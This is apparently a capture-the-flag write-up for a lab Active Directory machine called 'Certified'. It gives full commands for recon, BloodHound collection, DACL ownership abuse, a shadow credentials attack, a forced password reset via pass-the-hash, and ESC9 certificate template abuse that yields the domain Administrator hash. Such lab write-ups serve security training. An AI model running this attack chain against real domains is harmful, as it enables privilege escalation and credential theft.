![Certified](https://github.com/user-attachments/assets/99133812-c761-4692-aa66-6ec4b0d09c37)

## Reconnaissance & port scanning
We receive initial user and password `judith.mader::judith09` which we will use in the machine enumeration.

Scanning the machine with `nmap`:
```
# Nmap 7.95 scan initiated Fri Mar 14 13:03:13 2025 as: /usr/lib/nmap/nmap --privileged --privileged -sV -sC --open -oA logs/initial_recon/initial 10.10.11.41
Nmap scan report for 10.10.11.41 (10.10.11.41)
Host is up (0.034s latency).
Not shown: 988 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-14 19:03:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-14T19:04:57+00:00; +7h00m10s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-14T19:04:56+00:00; +7h00m10s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-14T19:04:57+00:00; +7h00m10s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-14T19:04:56+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m09s, deviation: 0s, median: 7h00m09s
| smb2-time: 
|   date: 2025-03-14T19:04:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 14 13:04:47 2025 -- 1 IP address (1 host up) scanned in 93.86 seconds
```

As we can see, the box is an Active Directory instance (as it hosts fundamental AD services, such as Kerberos, LDAP etc.). Now we will proceed to the machine itself in order to enumerate the network.

### Active Directory enumeration
As we cannot access the machine directly via `evil-winerm`, we need to base on unix-based enumeration tools. In this case, we run bloodhound ingestor via `nxc`:
```bash
nxc ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
```

After loading the results into Bloodhound, we can extract attack path that targets Certificate Authority account:

![01_bloodhound](https://github.com/user-attachments/assets/051d6297-c27b-460e-905b-b35e32a8fdbe)

## Lateral movement
### DACLs abuse
In order to perform gain access to `management_svc` account, we need to grant ownership over group `MANAGEMENT` to our current user, `judith.mader`. For this purpose, we can use `impacket`:
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

![02_owneredit](https://github.com/user-attachments/assets/17441c42-61fe-4246-b1b3-92d2db1b6d1b)

Now, we can give ourselves full permissions over the group:
```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
```

![03_dacledit](https://github.com/user-attachments/assets/f4eea632-00b0-496e-8399-2ac3367a9274)

We can verify the results of this action with the command:
```bash
net rpc group members "management" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

![04_verifying_groups](https://github.com/user-attachments/assets/17252488-cbe9-4a81-a93c-362cd90fa634)

As we can see, `judith.mader` was successfully added to the `management` group.
### Shadow credentials attack
After the DACLs abuse, targeted kerberoasting was performed. Unfortunately, the cracking attempts did not succeed and in order to gain access over the `management_svc` account, we need to utilize different measures, such as shadow credentials attack.

For this purpose we can utilize `certipy-ad` or `pywhisker`, which will add KeyCredential to the `msDs-KeyCredentialLink` of user `management_svc`:
```bash
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

![05_pywhisker](https://github.com/user-attachments/assets/6190f50b-be70-4f84-88ff-038a7fe0648f)

The command results in `.pfx` certificate, which need to be exported:
```bash
certipy-ad cert -export -pfx ./9hZvgJce.pfx -password PASSWORD -out "unprotected.pfx"
```

![06_export](https://github.com/user-attachments/assets/8910b3f2-6e88-4ed5-921d-f12901f7d875)

With this certificate, we can perform the attack, resulting in dumping `management_svc` account's hash:
```bash
certipy-ad auth -pfx ./unprotected.pfx -dc-ip 10.10.11.41 -username management_svc -domain certified.htb
```

![07_shadow_creds_attack](https://github.com/user-attachments/assets/07b23148-8d9e-485d-ac1c-11ef7ecba58b)

Using this hash, we can finally authenticate to the machine and read user's flag:

![08_user](https://github.com/user-attachments/assets/a97f471e-8afb-4781-a865-d3603915bc13)

## Further lateral movement
### Force-changing password for `ca_operator`
As user `management_svc` has `GenericAll` permission over user `ca_operator`, we can leverage this to force-change `ca_operator` password.

We do not possess plain-text password for user `management_svc`, so we will perform the attack with usage of `pth-net` tool and mask substitution:
```bash
pth-net rpc password "ca_operator" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"HASH" -S "dc01.certified.htb"
```

![09_force_change_pass](https://github.com/user-attachments/assets/21c935f9-d4d6-42c5-acb1-1efb225be7f0)

### Enumerating for certificate templates
Now we can enumerate existing certificate templates for search of vulnerable template:
```bash
certipy-ad find -u 'ca_operator' -p 'newP@ssword2022' -target dc01.certified.htb -dc-ip 10.10.11.41 -vulnerable -stdout
```
![10_vulnerable_template](https://github.com/user-attachments/assets/b7ae1c04-ebe6-40ff-a766-8eff6550f304)


As we can see, the domain contains dangerous template named `CertifiedAuthentication` vulnerable to ESC9 attack. This vulnerability allows requesting certificate on behalf of other user (i.e `Administrator`) as compromised user. The main requirement is we need some user, that has full rights over compromised user. 

In this case, we have all requirements fulfilled, as `management_svc` has full rights over `ca_operator` and the template does not have security extension.
### Abusing ADCS (ESC9)
For this attack, we will need `ca_operator`'s password hash, which can be generated with below command:
```bash
> echo -n 'newP@ssword2022' | iconv -t UTF-16LE | openssl dgst -md4

MD4(stdin)= fb54d1c05e301e024800c6ad99fe9b45

```

The attack starts with changing `ca_operator`'s userPrincipalName to `Administrator`, using permissions of `management_svc` user:
```bash
certipy-ad account update -username "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

![11_changing_upn](https://github.com/user-attachments/assets/7b912db1-014a-4964-9108-1c6133149eaa)

Next, we can request vulnerable certificate as `ca_operator`, pretending to be the `Administrator`:
```bash
certipy-ad req -username "ca_operator@certified.htb" -hashes :FB54D1C05E301E024800C6AD99FE9B45 -ca certified-DC01-CA -target dc01.certified.htb -dc-ip 10.10.11.41 -template CertifiedAuthentication -ns 10.10.11.41 -dns 10.10.11.41
```

![12_request_cert](https://github.com/user-attachments/assets/5f00f601-ac70-4158-8dfc-fd0d9a452a9f)

We need to revert changes to the `ca_operator`'s upn:
```bash
certipy-ad account update -username "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator
```

![13_revert_changes](https://github.com/user-attachments/assets/520bd2b0-ef40-4423-8a3c-ad1a01d911d7)

Finally, we can recover's `Administrator` hash using the certificate:
```bash
certipy-ad auth -pfx 'administrator.pfx' -domain "certified.htb"
```

![14_recover_hash](https://github.com/user-attachments/assets/2ece2e7a-b6d4-4f70-840d-621e70a401c5)

And authenticate to the domain controller:

![15_auth](https://github.com/user-attachments/assets/554a7dac-2c06-4024-8c89-95073fb87265)
